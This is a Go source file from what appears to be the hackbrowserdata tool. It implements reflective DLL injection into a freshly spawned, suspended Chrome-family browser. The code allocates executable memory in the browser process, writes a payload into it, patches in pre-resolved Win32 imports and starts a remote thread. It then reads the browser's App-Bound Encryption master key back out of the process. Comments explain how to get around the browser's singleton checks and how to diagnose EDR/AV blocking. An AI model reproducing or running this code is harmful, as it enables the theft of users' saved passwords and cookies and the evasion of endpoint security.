//go:build windows

package injector

import (
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"time"

	"golang.org/x/sys/windows"

	"github.com/moond4rk/hackbrowserdata/crypto/windows/abe_native/bootstrap"
	"github.com/moond4rk/hackbrowserdata/utils/winapi"
)

type Reflective struct {
	WaitTimeout time.Duration
}

const (
	exportName = "Bootstrap"
	// 30s covers GoogleChromeElevationService cold-start on first call after boot.
	defaultWait   = 30 * time.Second
	terminateWait = 2 * time.Second
)

func (r *Reflective) Inject(exePath string, payload []byte, env map[string]string) ([]byte, error) {
	if len(payload) == 0 {
		return nil, fmt.Errorf("injector: empty payload")
	}
	if exePath == "" {
		return nil, fmt.Errorf("injector: empty exePath")
	}

	loaderRVA, err := validateAndLocateLoader(payload)
	if err != nil {
		return nil, err
	}

	patched, err := patchPreresolvedImports(payload)
	if err != nil {
		return nil, err
	}

	restore := setEnvTemporarily(env)
	defer restore()

	pi, udd, err := spawnSuspended(exePath)
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(udd)
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	terminated := false
	defer func() {
		if !terminated {
			_ = windows.TerminateProcess(pi.Process, 1)
			_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
		}
	}()

	remoteBase, err := writeRemotePayload(pi.Process, patched)
	if err != nil {
		return nil, err
	}

	// Resume briefly so ntdll loader init completes before we hijack a thread; Bootstrap itself is
	// self-contained but the later elevation_service COM call inside the payload relies on a
	// fully-initialized PEB. Chrome's main() is left running so it can stand up its own COM/
	// scheduler infrastructure — the child will show a normal browser window under the isolated
	// --user-data-dir, which we accept; our Bootstrap finishes before the user sees anything.
	_, _ = windows.ResumeThread(pi.Thread)
	time.Sleep(500 * time.Millisecond)

	if err := runAndWait(pi.Process, remoteBase, loaderRVA, r.wait()); err != nil {
		return nil, err
	}

	// Read output before TerminateProcess — after kill the memory is gone.
	result, readErr := readScratch(pi.Process, remoteBase)

	_ = windows.TerminateProcess(pi.Process, 0)
	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
	terminated = true

	if readErr != nil {
		return nil, fmt.Errorf("injector: %w", readErr)
	}
	if result.Status != bootstrap.KeyStatusReady {
		return nil, fmt.Errorf("injector: payload did not publish key (%s)", formatABEError(result))
	}
	if len(result.Key) != bootstrap.KeyLen {
		return nil, fmt.Errorf("injector: payload signaled ready but key length is %d (want %d)",
			len(result.Key), bootstrap.KeyLen)
	}
	return result.Key, nil
}

// scratchResult is the structured view of the 12-byte diagnostic header (marker..com_err) plus the
// optional 32-byte master key the payload publishes back into the remote process's scratch region.
type scratchResult struct {
	Marker  byte
	Status  byte
	ErrCode byte
	HResult uint32
	ComErr  uint32
	Key     []byte
}

func (r *Reflective) wait() time.Duration {
	if r.WaitTimeout > 0 {
		return r.WaitTimeout
	}
	return defaultWait
}

func validateAndLocateLoader(payload []byte) (uint32, error) {
	arch, err := DetectPEArch(payload)
	if err != nil {
		return 0, fmt.Errorf("injector: detect payload arch: %w", err)
	}
	if arch != ArchAMD64 {
		return 0, fmt.Errorf("injector: only amd64 payload is supported (got %s)", arch)
	}
	off, err := FindExportFileOffset(payload, exportName)
	if err != nil {
		return 0, fmt.Errorf("injector: locate %s: %w", exportName, err)
	}
	return off, nil
}

// buildIsolatedCommandLine builds the command-line for a spawned, singleton-isolated Chromium process.
// Only --user-data-dir=<temp> is passed — this is the one switch that matters: it escapes the running
// browser's ProcessSingleton mutex so the suspended child survives past main() long enough for the
// remote Bootstrap thread to complete (issue #576). Adding any other flags (--no-startup-window,
// --disable-extensions, --disable-gpu, ...) has either destabilized Brave (payload dies in DllMain
// with marker=0x0b) or made newer Chromium forks on Windows 11 exit within ~200ms because they had
// "nothing to do" after bypassing window creation — letting the browser show a normal window under
// the isolated UDD is the most compatible behavior across forks and Windows versions.
func buildIsolatedCommandLine(exePath, udd string) string {
	// %q would Go-escape backslashes (C:\foo → C:\\foo); Windows CommandLineToArgvW then keeps them
	// as literal double backslashes in argv. Raw literal quotes match Windows command-line rules.
	//nolint:gocritic // sprintfQuotedString: %q is wrong for Windows command-line escaping, see above.
	return fmt.Sprintf(`"%s" --user-data-dir="%s"`, exePath, udd)
}

// spawnSuspended launches exePath in a fully isolated suspended state. A unique --user-data-dir is
// passed so the spawned chrome.exe does not collide with any already-running Chrome instance's
// ProcessSingleton (which would call ExitProcess as soon as main() runs, killing our remote Bootstrap
// thread before it can publish the master key). The temp UDD is returned so the caller can remove it
// after injection.
func spawnSuspended(exePath string) (*windows.ProcessInformation, string, error) {
	udd, err := os.MkdirTemp("", "hbd-inj-udd-*")
	if err != nil {
		return nil, "", fmt.Errorf("injector: make temp user-data-dir: %w", err)
	}

	cmdLine := buildIsolatedCommandLine(exePath, udd)
	cmdPtr, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		_ = os.RemoveAll(udd)
		return nil, "", fmt.Errorf("injector: command line: %w", err)
	}
	exePtr, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		_ = os.RemoveAll(udd)
		return nil, "", fmt.Errorf("injector: exe path: %w", err)
	}
	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	err = windows.CreateProcess(
		exePtr, cmdPtr, nil, nil,
		false,
		windows.CREATE_SUSPENDED,
		nil, nil, si, pi,
	)
	if err != nil {
		_ = os.RemoveAll(udd)
		return nil, "", fmt.Errorf("injector: CreateProcess: %w", err)
	}
	return pi, udd, nil
}

func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
	remoteBase, err := winapi.VirtualAllocEx(proc,
		uintptr(len(payload)),
		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uint32(windows.PAGE_EXECUTE_READWRITE),
	)
	if err != nil {
		return 0, fmt.Errorf("injector: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(proc, remoteBase, &payload[0], uintptr(len(payload)), &written); err != nil {
		return 0, fmt.Errorf("injector: WriteProcessMemory: %w", err)
	}
	if int(written) != len(payload) {
		return 0, fmt.Errorf("injector: short write to target (%d/%d)", written, len(payload))
	}
	return remoteBase, nil
}

// stillActive is the Windows STILL_ACTIVE exit code. GetExitCodeProcess returns this while the
// process is still running; any other value means the process has already terminated.
const stillActive uint32 = 259

func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
	entry := remoteBase + uintptr(loaderRVA)
	hThread, err := winapi.CreateRemoteThread(proc, entry, 0)
	if err != nil {
		// Diagnostic: distinguish a dead target (Chrome self-exited before we could inject — policy,
		// version, UDD-restriction, sandbox-init failure) from a live target whose NtCreateThreadEx
		// was blocked by an EDR/AV hook. The remediation is very different in each case.
		var exitCode uint32
		if gecErr := windows.GetExitCodeProcess(proc, &exitCode); gecErr == nil {
			if exitCode == stillActive {
				return fmt.Errorf("injector: %w (target alive; likely EDR/AV blocking remote-thread injection)", err)
			}
			return fmt.Errorf("injector: %w (target exited with code 0x%x before injection)", err, exitCode)
		}
		return fmt.Errorf("injector: %w", err)
	}
	defer windows.CloseHandle(hThread)

	state, err := windows.WaitForSingleObject(hThread, uint32(wait/time.Millisecond))
	if err != nil {
		return fmt.Errorf("injector: WaitForSingleObject: %w", err)
	}
	switch state {
	case windows.WAIT_OBJECT_0:
		return nil
	case uint32(windows.WAIT_TIMEOUT):
		return fmt.Errorf("injector: remote Bootstrap thread timed out after %s", wait)
	default:
		return fmt.Errorf("injector: remote Bootstrap thread wait returned 0x%x", state)
	}
}

// readScratch pulls the payload's diagnostic header and (on success) the master key out of the target
// process's scratch region. A non-nil error means our own ReadProcessMemory call failed (distinct from
// the payload reporting a structured failure via result.Status/ErrCode/HResult).
func readScratch(proc windows.Handle, remoteBase uintptr) (scratchResult, error) {
	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code, _reserved, hresult (LE u32),
	// com_err (LE u32).
	var hdr [12]byte
	var n uintptr
	if err := windows.ReadProcessMemory(proc,
		remoteBase+uintptr(bootstrap.MarkerOffset),
		&hdr[0], uintptr(len(hdr)), &n); err != nil {
		return scratchResult{}, fmt.Errorf("read scratch header: %w", err)
	}
	if int(n) != len(hdr) {
		return scratchResult{}, fmt.Errorf("read scratch header: short read %d/%d", n, len(hdr))
	}
	result := scratchResult{
		Marker:  hdr[0],
		Status:  hdr[1],
		ErrCode: hdr[2],
		HResult: binary.LittleEndian.Uint32(hdr[4:8]),
		ComErr:  binary.LittleEndian.Uint32(hdr[8:12]),
	}
	if result.Status != bootstrap.KeyStatusReady {
		return result, nil
	}

	buf := make([]byte, bootstrap.KeyLen)
	if err := windows.ReadProcessMemory(proc,
		remoteBase+uintptr(bootstrap.KeyOffset),
		&buf[0], uintptr(bootstrap.KeyLen), &n); err != nil {
		return result, fmt.Errorf("read master key from scratch: %w", err)
	}
	if int(n) != bootstrap.KeyLen {
		return result, fmt.Errorf("read master key from scratch: short read %d/%d", n, bootstrap.KeyLen)
	}
	result.Key = buf
	return result, nil
}

// patchPreresolvedImports writes five pre-resolved Win32 function pointers into the payload's DOS stub
// so Bootstrap skips PEB.Ldr traversal entirely. Validity relies on KnownDlls + session-consistent
// ASLR (kernel32 and ntdll share the same virtual address across processes in one boot session).
func patchPreresolvedImports(payload []byte) ([]byte, error) {
	if len(payload) < bootstrap.ImpNtFlushICOffset+8 {
		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
	}

	pLoadLibraryA := winapi.AddrLoadLibraryA()
	pGetProcAddress := winapi.AddrGetProcAddress()
	pVirtualAlloc := winapi.AddrVirtualAlloc()
	pVirtualProtect := winapi.AddrVirtualProtect()
	pNtFlushIC := winapi.AddrNtFlushInstructionCache()

	if pLoadLibraryA == 0 || pGetProcAddress == 0 || pVirtualAlloc == 0 ||
		pVirtualProtect == 0 || pNtFlushIC == 0 {
		return nil, fmt.Errorf("injector: failed to resolve one or more pre-resolved imports")
	}

	patched := make([]byte, len(payload))
	copy(patched, payload)

	writeAddr := func(off int, addr uintptr) {
		binary.LittleEndian.PutUint64(patched[off:off+8], uint64(addr))
	}
	writeAddr(bootstrap.ImpLoadLibraryAOffset, pLoadLibraryA)
	writeAddr(bootstrap.ImpGetProcAddressOffset, pGetProcAddress)
	writeAddr(bootstrap.ImpVirtualAllocOffset, pVirtualAlloc)
	writeAddr(bootstrap.ImpVirtualProtectOffset, pVirtualProtect)
	writeAddr(bootstrap.ImpNtFlushICOffset, pNtFlushIC)

	return patched, nil
}

// setEnvTemporarily mutates the current process's env; NOT concurrency-safe. Callers must serialize
// Inject calls.
func setEnvTemporarily(env map[string]string) func() {
	if len(env) == 0 {
		return func() {}
	}

	type prev struct {
		key   string
		value string
		set   bool
	}
	saved := make([]prev, 0, len(env))
	for k, v := range env {
		old, existed := os.LookupEnv(k)
		saved = append(saved, prev{key: k, value: old, set: existed})
		_ = os.Setenv(k, v)
	}

	return func() {
		for _, p := range saved {
			if p.set {
				_ = os.Setenv(p.key, p.value)
			} else {
				_ = os.Unsetenv(p.key)
			}
		}
	}
}
